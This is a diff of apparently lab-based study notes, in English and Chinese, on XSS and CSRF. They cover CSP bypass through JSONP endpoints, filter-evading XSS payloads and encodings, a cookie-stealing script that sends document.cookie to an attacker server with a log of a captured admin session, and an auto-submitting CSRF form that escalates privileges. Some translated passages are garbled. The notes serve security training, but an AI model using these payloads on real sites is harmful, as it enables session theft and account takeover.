+<pre><code>&lt;script src="/js/useful.js"&gt;&lt;/script&gt; &lt;script src="https://benignsite.htb/main.js"&gt;&lt;/script&gt;</code></pre>
+<p>In addition, because the <code>unsafe-inline</code> value is not specified, it blocks all inline scripts. As a result, the following potential XSS payloads are blocked and will not execute:</p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt; &lt;img src=x onerror=alert(1) /&gt; &lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code></pre>
 <p>Additionally, there are some other common directives:</p>
-<ul><li><code>style-src</code>Allowed sources for style sheets</li><li><code>img-src</code>Allowed image sources</li><li><code>object-src</code>Allowed sources such as objects<code>&lt;object&gt;</code>or<code>&lt;embed&gt;</code></li><li><code>connect-src</code>Sources that allow scripts to make HTTP requests. For example, use<code>XMLHttpRequest</code></li><li><code>default-src</code>: This fallback value is used if no other directive is explicitly set. For example, if<code>img-src</code>This directive does not exist in CSP, the browser will use this value to process the image.</li><li><code>frame-ancestors</code>Allows the source to frame the page, for example, in<code>&lt;div&gt; </code>Within tag\`<code>&lt;iframe&gt;</code><code>This directive can be used to prevent</code><code>Clickjacking</code>\`Attack.</li><li>\`<code>form-action</code>\`Form submission allowed sources</li></ul>
+<ul><li><code>style-src</code>: allowed sources for style sheets</li><li><code>img-src</code>: allowed image sources</li><li><code>object-src</code>: allowed sources for embedded objects such as <code>&lt;object&gt;</code> or <code>&lt;embed&gt;</code></li><li><code>connect-src</code>: sources that scripts may contact with HTTP requests, for example through <code>XMLHttpRequest</code></li><li><code>default-src</code>: This fallback value is used if no other directive is explicitly set. For example, if the <code>img-src</code> directive does not exist in the CSP, the browser will use this value to process the image.</li><li><code>frame-ancestors</code>: controls which sources may embed the page in a frame, such as an <code>&lt;iframe&gt;</code>. This directive can help prevent clickjacking.</li><li><code>form-action</code>: allowed destinations for form submissions</li></ul>
 <p>Other values for the directive include:</p>
-<pre><code>- \`*\`所有来源均允许
-- \`'none'\`不允许任何来源.
-- \`*.benignsite.htb\`所有子域名\`benignsite.htb\`均允许访问.
-- \`unsafe-inline\`允许行内元素
-- \`unsafe-eval\`允许动态代码执行, 例如 JavaScript 的\`eval\`函数
-- \`sha256-407e1bf4a1472948aa7b15cafa752fcf8e90710833da8a59dd8ef8e7fe56f22d\`允许通过哈希值添加元素
-- \`nonce-S0meR4nd0mN0nC3\`允许通过 nonce 添加元素</code></pre>
+<pre><code>- \`*\`: all sources are allowed
+- \`'none'\`: no sources are allowed
+- \`*.benignsite.htb\`: all subdomains of \`benignsite.htb\` are allowed
+- \`unsafe-inline\`: inline elements are allowed
+- \`unsafe-eval\`: dynamic code execution is allowed, such as JavaScript's \`eval\` function
+- \`sha256-407e1bf4a1472948aa7b15cafa752fcf8e90710833da8a59dd8ef8e7fe56f22d\`: allows an element by hash
+- \`nonce-S0meR4nd0mN0nC3\`: allows an element by nonce</code></pre>
 <p>For other CSP directive values, see the list provided here.</p>
 <hr/>
 <h3>Security CSP</h3>
 <p>Enforcing content security policies (CSP) as strictly as possible is critical to ensuring the security of web applications. A good approach is to start with a strict baseline CSP and gradually relax the restrictions until the web application behaves as expected. A good baseline CSP is as follows:</p>
-<p>http <code>Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';</code></p>
+<pre><code>Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';</code></pre>
 <p>This Content Security Policy (CSP) only allows images, stylesheets, and scripts to be loaded from the same source. It also only allows JavaScript to make HTTP requests and form submissions to the same origin, only allows resources from the same origin to be embedded in web pages, and prevents any other resources from loading. If any external resources are used, this CSP must be adjusted accordingly.</p>
 <p>Additionally, inline JavaScript code used by web applications must be removed to prevent it from being blocked. This can be easily accomplished by moving it to a script file and loading it. For example, consider the following inline JavaScript code:</p>
-<p>html <code>&lt;script&gt; var poc = "test"; function submitForm(){     console.log(poc); } &lt;/script&gt; &lt;button id="submit" onclick="submitForm()"&gt;</code></p>
-<p><code>test.js</code>The code provided is functionally identical to creating a file containing:</p>
-<p>js <code>var poc = "test"; function submitForm(){     console.log(poc); } document.getElementById("submit").addEventListener('click', submitForm);</code></p>
+<pre><code>&lt;script&gt; var poc = "test"; function submitForm(){     console.log(poc); } &lt;/script&gt; &lt;button id="submit" onclick="submitForm()"&gt;</code></pre>
+<p>Create <code>test.js</code> with functionally equivalent code:</p>
+<pre><code>var poc = "test"; function submitForm(){     console.log(poc); } document.getElementById("submit").addEventListener('click', submitForm);</code></pre>
 <p>Then load the script:</p>
-<p>html <code>&lt;script src="/test.js"&gt;&lt;/script&gt;</code></p>
+<pre><code>&lt;script src="/test.js"&gt;&lt;/script&gt;</code></pre>
 <p>This removes all inline JavaScript code.</p>
 <p>We can use existing online tools to assess cloud security policies (CSP), such as the CSP assessment tool provided by Google. For more details on how to write a secure CSP, see the OWASP CSP Cheat Sheet.</p>
 <h2>Bypass weak CSPs</h2>
@@ -1711,65 +1711,65 @@ xhr.send(params);</code></pre>
 <p>Now that we have discussed CSP, CSP instructions, and CSP instruction values, let’s discuss how to exploit and bypass weak CSP.</p>
 <hr/>
 <h3>Bypass weak CSPs</h3>
-<p>Cyber Security Policy (CSP) can be used as a defense-in-depth measure to prevent cross-site scripting attacks (XSS). However, even if a web application implements CSP, it does not mean that it is automatically protected against all XSS attacks. If the CSP is vulnerable, it is possible for an attacker to bypass it. Therefore, it is crucial to analyze a web application's CSP for potential bypass vulnerabilities.</p>
+<p>Content Security Policy (CSP) can be used as a defense-in-depth measure to prevent cross-site scripting attacks (XSS). However, even if a web application implements CSP, it does not mean that it is automatically protected against all XSS attacks. If the CSP is vulnerable, it is possible for an attacker to bypass it. Therefore, it is crucial to analyze a web application's CSP for potential bypass vulnerabilities.</p>
 <p>Let’s first look at the CSP below:</p>
-<p>http <code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; font-src *; script-src 'self' https://*.google.com;</code></p>
-<p>This CSP allows loading of images from the source itself, loading of styles and fonts from any location, and loading of scripts from the source itself and any of its subdomains<code>google.com</code>. All other resources cannot be loaded due to this directive<code>default-src 'none'</code>.</p>
+<pre><code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; font-src *; script-src 'self' https://*.google.com;</code></pre>
+<p>This CSP allows loading of images from the source itself, loading of styles and fonts from any location, and loading of scripts from the source itself and any of its subdomains <code>google.com</code>. All other resources cannot be loaded due to this directive <code>default-src 'none'</code>.</p>
 <p>Let's say we try to inject a simple warning popup into a web application as a proof of concept:</p>
-<p>html <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
 <p>Due to CSP limitations, the warning popup will not be displayed; instead, the browser's JavaScript console will print the following error message:</p>
-<p>html <code>Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' https://*.google.com". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.</code></p>
-<p>While this defense technique may seem secure at first glance, it can pass<a href="https://www.w3schools.com/js/js_json_jsonp.asp" rel="noreferrer" target="_blank">JSONP</a>Bypass. JSONP is a technology that can retrieve data across different sources without being restricted by the same-origin policy. The basic idea of JSONP is to use<code>script</code>Tags to retrieve data across sources because tags are not restricted by the same-origin policy. For example, suppose a web application<code>https://vulnerablesite.htb</code>want to start from endpoint<code>&lt;endpoint&gt;</code> Retrieve data<code>https://someapi.htb/stats</code>, this endpoint returns the following JSON data:</p>
-<p>JSON <code>{'clicks': 1337}</code></p>
+<pre><code>Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' https://*.google.com". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.</code></pre>
+<p>While this defense technique may seem secure at first glance, it can be bypassed through <a href="https://www.w3schools.com/js/js_json_jsonp.asp" rel="noreferrer" target="_blank">JSONP</a>. JSONP is a technology that can retrieve data across different sources without being restricted by the same-origin policy. The basic idea of JSONP is to use <code>script</code> tags to retrieve data across sources because tags are not restricted by the same-origin policy. For example, suppose a web application at <code>https://vulnerablesite.htb</code> wants to retrieve data from the endpoint <code>https://someapi.htb/stats</code>, this endpoint returns the following JSON data:</p>
+<pre><code>{'clicks': 1337}</code></pre>
 <p>If the API is not configured with CORS, the web application cannot access the response to the cross-domain request due to the same-origin policy restrictions. However, because script tags are not subject to the same-origin policy, web applications can load data by using the following HTML tags on their pages:</p>
-<p>html <code>&lt;script src="https://someapi.htb/stats"&gt;&lt;/script&gt;</code></p>
-<p>However, this is not practical in itself because the web application needs to process the data in some way. Assume that the web application implements a<code>processData</code>function for this purpose. However, there is currently no way to pass the received data to this function. This is where JSONP comes in handy. If the API supports JSONP, it reads the GET parameters on the endpoint sending the data and adjusts the response accordingly. This parameter is usually called<code>get_data</code> <code>callback</code>. Let's say we call the endpoint<code>get_data</code> <code>https://someapi.htb/stats?callback=processData</code>. This will cause the API to send the following response:</p>
-<p>js <code>processData({'clicks': 1337})</code></p>
+<pre><code>&lt;script src="https://someapi.htb/stats"&gt;&lt;/script&gt;</code></pre>
+<p>However, this is not practical in itself because the web application needs to process the data in some way. Assume that the web application implements a <code>processData</code> function for this purpose. However, there is currently no way to pass the received data to this function. This is where JSONP comes in handy. If the API supports JSONP, it reads the GET parameters on the endpoint sending the data and adjusts the response accordingly. This parameter is usually called <code>get_data</code> <code>callback</code>. Let's say we call the endpoint <code>get_data</code> <code>https://someapi.htb/stats?callback=processData</code>. This will cause the API to send the following response:</p>
+<pre><code>processData({'clicks': 1337})</code></pre>
 <p>Web applications can now insert the following script tags on their pages:</p>
-<p>html <code>&lt;script src="https://someapi.htb/stats?callback=processData"&gt;&lt;/script&gt;</code></p>
-<p>This allows you to make calls to your web application on data obtained from the API across domains.<code>processData</code>functionality without violating the Same Origin Policy or requiring CORS.</p>
-<p>Because JSONP endpoints allow the caller to specify a function to call, they can be used to dynamically create JavaScript code sent by a domain that provides a JSONP endpoint. Therefore, JSONP can be used to bypass Content Security Policy (CSP). Google provides several different JSONP endpoints. JSONBee<a href="https://github.com/zigoo0/JSONBee" rel="noreferrer" target="_blank">GitHub</a>The repository lists a number of JSONP endpoints that can be used to bypass CSP. We can bypass the above CSP using the following Google JSONP endpoint:</p>
-<p>html <code>&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"&gt;&lt;/script&gt;</code></p>
+<pre><code>&lt;script src="https://someapi.htb/stats?callback=processData"&gt;&lt;/script&gt;</code></pre>
+<p>This allows the web application to call its <code>processData</code> function with data obtained from the API across origins without violating the Same Origin Policy or requiring CORS.</p>
+<p>Because JSONP endpoints allow the caller to specify a function to call, they can be used to dynamically create JavaScript code sent by a domain that provides a JSONP endpoint. Therefore, JSONP can be used to bypass Content Security Policy (CSP). Google provides several JSONP endpoints. The JSONBee <a href="https://github.com/zigoo0/JSONBee" rel="noreferrer" target="_blank">GitHub</a> repository lists a number of JSONP endpoints that can be used to bypass CSP. We can bypass the above CSP using the following Google JSONP endpoint:</p>
+<pre><code>&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"&gt;&lt;/script&gt;</code></pre>
 <p>Posting this entry to the guestbook triggers a warning popup, thus bypassing Content Security Policy (CSP):</p>
 <p>https://vulnerablesite.htb/view.php</p>
 <img alt="Referenced image" src="https://cdn.services-k8s.prod.aws.htb.systems/content/modules/235/xss/xss_csp_1.png"/>
-<p>Another common pitfall is assuming<code>'self'</code>The value itself is safe. For example, consider the following CSP:</p>
-<p>http <code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; script-src 'self';</code></p>
-<p>This time, the script can only be loaded from the origin server itself. This seems safe assuming the origin server does not provide a JSONP endpoint. However, consider a situation where a web application allows users to upload files. If any file type is allowed to be uploaded, an attacker can upload files<code>.js</code>. An attacker can then exploit the XSS vulnerability by loading the uploaded payload from the origin server itself:</p>
-<p>html <code>&lt;script src="/uploads/avatag.jpg.js"&gt;&lt;/script&gt;</code></p>
-<p>Typically, the evaluation of a Content Security Policy (CSP) depends on the specific CSP itself and the functionality of the web application. As we can see, if a web application implements file upload functionality, it will<code>script-src</code>directive set to true<code>'self'</code>May be unsafe. Therefore, it is crucial to evaluate CSP in the context of a specific web application.</p>
+<p>Another common pitfall is assuming the <code>'self'</code> value is safe by itself. For example, consider the following CSP:</p>
+<pre><code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; script-src 'self';</code></pre>
+<p>This time, the script can only be loaded from the origin server itself. This seems safe assuming the origin server does not provide a JSONP endpoint. However, consider a situation where a web application allows users to upload files. If any file type is allowed to be uploaded, an attacker can upload files <code>.js</code>. An attacker can then exploit the XSS vulnerability by loading the uploaded payload from the origin server itself:</p>
+<pre><code>&lt;script src="/uploads/avatag.jpg.js"&gt;&lt;/script&gt;</code></pre>
+<p>Typically, the evaluation of a Content Security Policy (CSP) depends on the specific CSP itself and the functionality of the web application. As we can see, if a web application implements file upload functionality, setting the <code>script-src</code> directive to <code>'self'</code> may be unsafe. Therefore, it is crucial to evaluate CSP in the context of a specific web application.</p>
 <p>&lt;scriPt sRc="https://exploitserver.htb/exploit"&gt;&lt;/scripT&gt;</p>
 <h2>XSS filter bypass</h2>
 <p><strong>Implement JavaScript execution</strong> Before discussing how to bypass XSS filters, we'll explore three ways to achieve JavaScript code execution.</p>
-<p>The most common (and obvious) way to achieve code execution is to use<code>script</code> tag; the web browser will execute any JavaScript code contained within it:</p>
+<p>The most common (and obvious) way to achieve code execution is to use <code>script</code> tag; the web browser will execute any JavaScript code contained within it:</p>
 <ul><li><strong>script tag</strong></li></ul>
 <pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
-<p>We can use pseudo-protocols (e.g.<code>javascript</code>or<code>data</code>) to specify the loading location of data in certain HTML attributes to implement JavaScript code execution. For example, we can<code>a</code>The label's target is set to<code>javascript</code>Pseudo-protocol so that when a link is clicked, the corresponding JavaScript code is executed:</p>
+<p>We can use pseudo-protocols (e.g.<code>javascript</code> or <code>data</code>) to specify the loading location of data in certain HTML attributes to implement JavaScript code execution. For example, we can <code>a</code> The label's target is set to <code>javascript</code> Pseudo-protocol so that when a link is clicked, the corresponding JavaScript code is executed:</p>
 <ul><li><strong>pseudo-agreement</strong></li></ul>
 <pre><code class="language-html">&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code></pre>
-<p>We can also create XSS payloads with pseudo-protocols that require no user action. For example, use<code>object</code>label. <code>data</code>The pseudo-protocol allows us to specify plain HTML code or base64-encoded HTML code:</p>
+<p>We can also create XSS payloads with pseudo-protocols that require no user action. For example, use <code>object</code> label. <code>data</code> The pseudo-protocol allows us to specify plain HTML code or base64-encoded HTML code:</p>
 <pre><code class="language-html">&lt;object data="javascript:alert(1)"&gt;
 &lt;object data="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
 &lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;</code></pre>
-<p>Third, we can use event handlers like<code>onload</code> or<code>onerror</code> to specify JavaScript code to be executed when the event handler is triggered:</p>
+<p>Third, we can use event handlers like <code>onload</code> or <code>onerror</code> to specify JavaScript code to be executed when the event handler is triggered:</p>
 <ul><li><strong>Event Handlers Event Handlers</strong></li></ul>
 <pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;
 &lt;svg onload=alert(1)&gt;</code></pre>
 <p>We have a number of event handling tools that can be used for this purpose. PortSwigger's XSS Cheat Sheet provides a good overview.</p>
 <h3>Bypass basic blacklist</h3>
-<p>Suppose a web application implements a simple blacklist to block keywords that may cause JavaScript code to be executed. For example, by blocking something like<code>JavaScript</code>tags such as HTML tags, like<code>JavaScript</code> and<code>data</code> Such pseudo-protocols, as well as<code>onload</code> and<code>onerror</code> Such an event handler.</p>
+<p>Suppose a web application implements a simple blacklist to block keywords that may cause JavaScript code to be executed. For example, by blocking something like <code>JavaScript</code> tags such as HTML tags, like <code>JavaScript</code> and <code>data</code> Such pseudo-protocols, as well as <code>onload</code> and <code>onerror</code> Such an event handler.</p>
 <p>In this case, we can try some methods to bypass the naive blacklist. For example, shells in HTML tags, pseudo-protocols, and event handlers are irrelevant. More specifically, we can use a mix of lowercase and uppercase letters to bypass blacklists that only block lowercase keywords:</p>
 <pre><code class="language-html">&lt;ScRiPt&gt;alert(1);&lt;/ScRiPt&gt;
 &lt;object data="JaVaScRiPt:alert(1)"&gt;
 &lt;img src=x OnErRoR=alert(1)&gt;</code></pre>
-<p>Furthermore, if a naive blacklist removes all keywords<code>&lt;script&gt;</code> appears, but without recursive application, we can bypass this filter with a payload like:</p>
+<p>Furthermore, if a naive blacklist removes all keywords <code>&lt;script&gt;</code> appears, but without recursive application, we can bypass this filter with a payload like:</p>
 <pre><code class="language-html">&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;/scr&lt;script&gt;ipt&gt;</code></pre>
 <p>Finally, if the blacklist uses assumptions about HTML tag syntax or weak regular expressions that only block certain special characters, we may be able to bypass the blacklist by breaking these assumptions. For example, if the blacklist does not allow spaces before any event handlers or input fields, the following payload may bypass the filter:</p>
 <pre><code class="language-html">&lt;svg/onload=alert(1)&gt;
 &lt;script/src="https://exploit.htb/exploit"&gt;&lt;/script&gt;</code></pre>
 <h3>Advanced bypass</h3>
-<p>Suppose we inject an HTML tag, thereby executing JavaScript code. In this case, we may need to bypass additional filters attached to the JavaScript code that restrict which functions we can call or which data we can access. There are many techniques we can employ to try to bypass these filters. We'll explore how to encode strings and pass those strings to<code>execution sinks</code>to execute JavaScript code to bypass the filter.</p>
-<p>In JavaScript, we can apply multiple encodings to strings that help us circumvent blacklists. The following is the string<code>"alert (1)"</code> Different encoding methods:</p>
+<p>Suppose we inject an HTML tag, thereby executing JavaScript code. In this case, we may need to bypass additional filters attached to the JavaScript code that restrict which functions we can call or which data we can access. There are many techniques we can employ to try to bypass these filters. We'll explore how to encode strings and pass those strings to <code>execution sinks</code> to execute JavaScript code to bypass the filter.</p>
+<p>In JavaScript, we can apply multiple encodings to strings that help us circumvent blacklists. The following is the string <code>"alert (1)"</code> Different encoding methods:</p>
 <pre><code class="language-js"># Unicode
 "\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"
 
@@ -1790,7 +1790,7 @@ String.fromCharCode(97,108,101,114,116,40,49,41)
 
 # URL Encoding
 decodeURI(/alert(%22xss%22)/.source)</code></pre>
-<p>So far, we can only serve the payload as a string; however, the browser will only execute it if it is passed to an execution import that receives a string as input. The most famous example of this type of execution exchange is<code>eval</code>  function; except<code>eval</code>, other execution summaries also include:</p>
+<p>So far, we can only serve the payload as a string; however, the browser will only execute it if it is passed to an execution import that receives a string as input. The most famous example of this type of execution exchange is <code>eval</code>  function; except <code>eval</code>, other execution summaries also include:</p>
 <pre><code class="language-js">eval("alert(1)")
 setTimeout("alert(1)")
 setInterval("alert(1)")
@@ -1808,7 +1808,7 @@ Function(atob("YWxlcnQoMSk="))()</code></pre>
 <blockquote>攻击者把恶意脚本（通常是 JavaScript）注入到网页中，让其他用户在浏览该页面时执行这些脚本。</blockquote>
 <p>也就是说：</p>
 <ul><li>攻击代码被“存”在网页或请求里</li><li>浏览器误认为是“正常内容”执行了</li><li>最终<strong>在受害者浏览器中执行攻击者的代码</strong></li></ul>
-<div class="post-table-wrap"><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>Stored (Persistent) XSS</code></td><td>最严重的 XSS 类型是当用户输入存储在后端数据库中，然后在检索时显示（例如，帖子或评论）时发生的 XSS 攻击。</td></tr><tr><td><code>Reflected (Non-Persistent) XSS</code></td><td>当用户输入的内容经后端服务器处理后显示在页面上，但尚未存储时（例如，搜索结果或错误消息），就会发生这种情况。</td></tr><tr><td><br /><code>DOM-based XSS</code></td><td>另一种非持久性 XSS 类型，当用户输入直接显示在浏览器中并在客户端完全处理，而无需到达后端服务器时就会发生（例如，通过客户端 HTTP 参数或锚标记）。</td></tr></tbody></table></div>
+<div class="post-table-wrap"><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>Stored (Persistent) XSS</code></td><td>最严重的 XSS 类型是当用户输入存储在后端数据库中，然后在检索时显示（例如，帖子或评论）时发生的 XSS 攻击。</td></tr><tr><td><code>Reflected (Non-Persistent) XSS</code></td><td>当用户输入的内容经后端服务器处理后显示在页面上，但尚未存储时（例如，搜索结果或错误消息），就会发生这种情况。</td></tr><tr><td><br/><code>DOM-based XSS</code></td><td>另一种非持久性 XSS 类型，当用户输入直接显示在浏览器中并在客户端完全处理，而无需到达后端服务器时就会发生（例如，通过客户端 HTTP 参数或锚标记）。</td></tr></tbody></table></div>
 <pre><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;
 &lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
 <ul><li><code>window.origin</code> 显示的是当前站点的协议 + 域名 + 端口</li><li><code>document.cookie</code> 显示的是当前页面可读到的 Cookie</li></ul>
@@ -1856,7 +1856,7 @@ new Image().src='http://OUR_IP/index.php?c='+document.cookie;</code></pre>
 <p>跨站点请求伪造（CSRF）和跨站点脚本（XSS）</p>
 <p><strong>现代CSRF和XSS攻击的现实应用</strong> 我们将在本模块中讨论的那样，现代网络浏览器中的许多安全策略和安全措施限制或阻止了对 CSRF 漏洞的基本利用。例如，同源策略、跨域资源共享 (CORS) 和 SameSite Cookie，我们将在后续章节中进一步探讨。</p>
 <p>因此，在现实世界中，单纯的 CSRF 漏洞利用变得越来越少见。然而，如果我们发现 XSS 漏洞，就可以将 XSS 和 CSRF 漏洞的利用结合起来，从而获得一种强大的工具，使我们能够攻击存在漏洞的 Web 应用程序本身，甚至可能攻击受害者内部网络中的其他 Web 应用程序。</p>
-<p>要利用 CSRF 和 XSS 漏洞并与存在漏洞的 Web 应用程序交互，我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" target="_blank" rel="noreferrer">XMLHttpRequest</a>对象或更现代的<a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API" target="_blank" rel="noreferrer">Fetch API</a>。我们可以使用这两种方法从 JavaScript 代码发出 HTTP 请求，并指定 HTTP 参数，例如请求方法、HTTP 标头或请求体。</p>
+<p>要利用 CSRF 和 XSS 漏洞并与存在漏洞的 Web 应用程序交互，我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" rel="noreferrer" target="_blank">XMLHttpRequest</a>对象或更现代的<a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API" rel="noreferrer" target="_blank">Fetch API</a>。我们可以使用这两种方法从 JavaScript 代码发出 HTTP 请求，并指定 HTTP 参数，例如请求方法、HTTP 标头或请求体。</p>
 <p>例如，我们可以<code>XMLHttpRequest</code>通过在调用 <code>send_post()</code> 函数时指定 URL <code>xhr.open</code>、使用 <code>set_HTTP_headers()</code> 函数设置 HTTP 标头<code>xhr.setRequestHeader</code>以及在调用 <code>send_post_body()</code> 函数时指定请求体参数来使用该对象发送 POST 请求<code>xhr.send</code>：</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest(); 
 xhr.open('POST', 'http://exfiltrate.htb/', false); 
@@ -1875,9 +1875,9 @@ xhr.send('param1=hello&amp;param2=world');</code></pre>
 <ul><li>一个漏洞利用开发服务器<code>https://exploitserver.htb</code></li><li>我们正在评估给定虚拟主机上存在漏洞的Web应用程序。例如：<code>https://vulnerablesite.htb</code></li><li>此外，我们将在自己的系统上托管一个 HTTPS 网络服务器，以便我们能够泄露数据。</li></ul>
 <p><strong>漏洞利用开发服务器</strong></p>
 <p>我们可以使用漏洞开发服务器来<code>exploitserver.htb</code>开发 CSRF 或 XSS 有效载荷，并将漏洞利用程序传递给受害者。 漏洞利用开发服务器使我们能够开发针对目标 Web 应用程序中发现的特定漏洞的自定义漏洞利用程序。假设，对于目标 Web 应用程序中的 XSS 概念验证，我们希望触发一个警告框：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415041746.png" alt="Pasted image 20260415041746" />
+<img alt="Pasted image 20260415041746" src="assets/posts/advanced-xss-csrf/Pasted image 20260415041746.png"/>
 <p>我们可以通过访问该端点来查看我们开发的漏洞利用程序<code>/exploit</code>。这样做会触发警报弹出窗口：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415041800.png" alt="Pasted image 20260415041800" />
+<img alt="Pasted image 20260415041800" src="assets/posts/advanced-xss-csrf/Pasted image 20260415041800.png"/>
 <p>最后，我们可以通过访问目标端点将漏洞利用程序传递给受害者<code>/deliver</code>，这将导致受害者通过访问目标地址来触发我们开发的攻击载荷<code>https://exploitserver.htb/exploit</code>。这在 CSRF 攻击中非常有用，因为受害者必须主动访问攻击载荷才能触发漏洞利用代码。本模块侧重于漏洞利用程序的开发，而非漏洞利用程序的传递方法。将攻击载荷传递给受害者会强制触发漏洞利用程序。在现实世界中，存在多种漏洞利用程序传递方法，包括通过电子邮件或任何即时通讯服务向受害者发送链接。</p>
 <p>我们还可以利用漏洞利用服务器来开发 XSS 攻击载荷。但是，在这种情况下，我们无需将漏洞利用程序直接传递给受害者，因为攻击载荷会通过注入到易受攻击站点上的 XSS 攻击载荷进行传播。</p>
 <p><strong>HTTPS数据泄漏服务器</strong> 在本模块中，所有实验均运行在启用 HTTPS 的 Web 服务器上。现代 Web 浏览器实施了安全措施，防止 HTTPS 网站通过未加密的 HTTP 连接加载资源。为避免出现问题，我们将使用 Python 设置一个接受 HTTPS 请求的 Web 服务器。首先，我们需要为服务器生成一个新的自签名证书以支持加密通信。我们可以使用以下命令完成此操作。证书的详细信息可以任意指定：</p>
@@ -1929,16 +1929,16 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
 <p>之后，我们可以在攻击服务器上创建一个 cookie 窃取有效载荷，例如以下代码。为了窃取 cookie，我们可以使用系统上运行的 HTTPS 服务器：</p>
 <pre><code class="language-js">windows.location = "https://10.10.14.45:4443/cookiestealer?=" + document.cookie;</code></pre>
 <p>保存漏洞利用程序后，我们可以通过访问端点来确认程序是否已保存<code>/exploit</code>：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043149.png" alt="Pasted image 20260415043149" />
+<img alt="Pasted image 20260415043149" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043149.png"/>
 <p>最后，我们必须等待管理员用户访问留言簿。注入的 XSS 有效载荷会导致管理员的浏览器从攻击服务器加载有效载荷，从而将管理员用户的 cookie 泄露到我们的系统中：</p>
 <pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py 
 
 10.129.233.62 - - [31/Dec/2024 13:37:36] code 404, message File not found
 10.129.233.62 - - [31/Dec/2024 13:37:36] "GET /cookiestealer?c=PHPSESSID=tiitsevk7pns4kmrcmjecm9qq6 HTTP/1.1" 404</code></pre>
 <p><strong>CSRF</strong></p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043309.png" alt="Pasted image 20260415043309" />
+<img alt="Pasted image 20260415043309" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043309.png"/>
 <p>然而，我们可以看到我们只有<code>user</code>这些权限。这里有一个<code>promote</code>按钮。如果我们点击它，Web 应用程序会提示我们只有管理员用户才能提升其他用户。但是，我们可以看到提升操作是通过以下请求实现的：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043318.png" alt="Pasted image 20260415043318" />
+<img alt="Pasted image 20260415043318" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043318.png"/>
 <p>具体来说，这个端点缺少 CSRF 保护，这使得我们可以发起 CSRF 攻击，强制管理员提升我们用户的权限。为此，我们需要创建一个与提升请求对应的 HTML 表单：</p>
 <pre><code class="language-html">&lt;html&gt;
   &lt;body&gt;
@@ -1966,9 +1966,9 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
   &lt;/body&gt;
 &lt;/html&gt;</code></pre>
 <p><code>View Exploit</code>我们可以通过登录到存在漏洞的应用程序后点击某个链接来测试我们的漏洞利用。这将向某个服务器发送请求<code>https://exploitserver.htb/exploit</code>，该服务器会返回我们保存的有效载荷。该有效载荷会自动提交表单，从而向存在漏洞的 Web 应用程序发起跨域请求。但是，由于我们不是管理员，因此权限提升失败：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043428.png" alt="Pasted image 20260415043428" />
+<img alt="Pasted image 20260415043428" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043428.png"/>
 <p>然而，这证实了我们的 CSRF 有效载荷已成功发送 HTTP 请求以提升用户权限。要执行攻击，我们可以将有效载荷传递给受害者并选择当前的虚拟主机<code>csrf.labintro.htb</code>。这将导致受害者访问某个页面<code>https://exploitserver.htb/exploit</code>。等待几秒钟并刷新页面后，我们就会获得管理员权限：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043442.png" alt="Pasted image 20260415043442" />
+<img alt="Pasted image 20260415043442" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043442.png"/>
 <h2>同源策略与 CORS</h2>
 <h3>同源策略</h3>
 <p>同源策略是一种在网页浏览器中实现的安全机制，旨在防止网站的跨源访问。特别是，运行在一个源节点上的 JavaScript 代码无法访问另一个源节点。这防止恶意网站从其他来源窃取信息，并限制其向其他来源发送的请求类型。</p>
@@ -2001,9 +2001,9 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
